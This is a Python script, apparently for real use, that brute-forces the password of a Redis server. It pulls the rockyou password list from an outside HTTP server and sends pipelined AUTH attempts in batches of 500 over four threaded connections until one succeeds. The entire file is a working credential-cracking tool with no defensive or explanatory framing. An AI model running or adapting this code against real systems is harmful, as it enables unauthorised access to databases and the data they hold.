#!/usr/bin/env python3
"""Pipelined Redis AUTH brute force — streams wordlist via HTTP, pipelines AUTH batches"""
import socket, sys, urllib.request, threading, queue, time

REDIS_HOST = "172.18.0.1"
REDIS_PORT = 6379
WORDLIST_URL = "http://137.184.141.100:8888/rockyou.txt"
BATCH = 500
FOUND = threading.Event()
RESULT = queue.Queue()

def worker(wid, line_queue):
    """Each worker has its own connection, pipelines AUTH attempts"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((REDIS_HOST, REDIS_PORT))
    except Exception as e:
        RESULT.put(f"WORKER{wid}_CONN_FAIL:{e}")
        return

    batch = []
    while not FOUND.is_set():
        try:
            word = line_queue.get_nowait()
        except queue.Empty:
            break
        if word is None:
            break
        batch.append(word)
        if len(batch) >= BATCH:
            # Send pipelined AUTHs
            try:
                payload = b""
                for w in batch:
                    w = w.strip()
                    if not w or len(w) > 200:
                        continue
                    payload += b"AUTH " + w.encode('utf-8', 'ignore') + b"\r\n"
                if not payload:
                    batch = []
                    continue
                s.sendall(payload)
                # Read all responses
                buf = b""
                expected = payload.count(b"AUTH ")
                responses = []
                s.settimeout(15)
                while len(responses) < expected:
                    chunk = s.recv(65536)
                    if not chunk:
                        break
                    buf += chunk
                    # Count complete RESP lines (+OK or -ERR)
                    while b"\r\n" in buf:
                        line, buf = buf.split(b"\r\n", 1)
                        responses.append(line)
                # Match responses to words
                pwds = [w.strip() for w in batch if w.strip() and len(w.strip()) <= 200]
                for i, resp in enumerate(responses):
                    if resp.startswith(b"+OK"):
                        found_pw = pwds[i] if i < len(pwds) else "???"
                        RESULT.put(f"FOUND:{found_pw}")
                        FOUND.set()
                        s.close()
                        return
                batch = []
            except Exception as e:
                RESULT.put(f"WORKER{wid}_ERR:{e}")
                try:
                    s.close()
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(10)
                    s.connect((REDIS_HOST, REDIS_PORT))
                except:
                    return
                batch = []
    try:
        s.close()
    except:
        pass

def main():
    print("START", flush=True)
    line_queue = queue.Queue(maxsize=20000)

    # Producer: stream wordlist from HTTP
    def producer():
        try:
            req = urllib.request.Request(WORDLIST_URL)
            with urllib.request.urlopen(req, timeout=60) as resp:
                buf = b""
                count = 0
                while not FOUND.is_set():
                    chunk = resp.read(65536)
                    if not chunk:
                        break
                    buf += chunk
                    while b"\n" in buf:
                        line, buf = buf.split(b"\n", 1)
                        line_queue.put(line.decode('utf-8', 'ignore').strip())
                        count += 1
                if buf.strip():
                    line_queue.put(buf.decode('utf-8','ignore').strip())
            print(f"PRODUCER_DONE:{count}", flush=True)
        except Exception as e:
            RESULT.put(f"PRODUCER_ERR:{e}")

    pt = threading.Thread(target=producer, daemon=True)
    pt.start()

    # 4 workers
    threads = []
    for i in range(4):
        t = threading.Thread(target=worker, args=(i, line_queue), daemon=True)
        t.start()
        threads.append(t)

    # Monitor
    start = time.time()
    while not FOUND.is_set():
        try:
            r = RESULT.get(timeout=300)
            print(r, flush=True)
            if r.startswith("FOUND:"):
                break
        except queue.Empty:
            break
        # Check if all workers dead
        if not any(t.is_alive() for t in threads) and line_queue.empty():
            break

    # Drain remaining results
    while not RESULT.empty():
        print(RESULT.get(), flush=True)

    elapsed = time.time() - start
    if FOUND.is_set():
        print(f"DONE_FOUND in {elapsed:.0f}s", flush=True)
    else:
        print(f"DONE_NOT_FOUND in {elapsed:.0f}s", flush=True)

main()
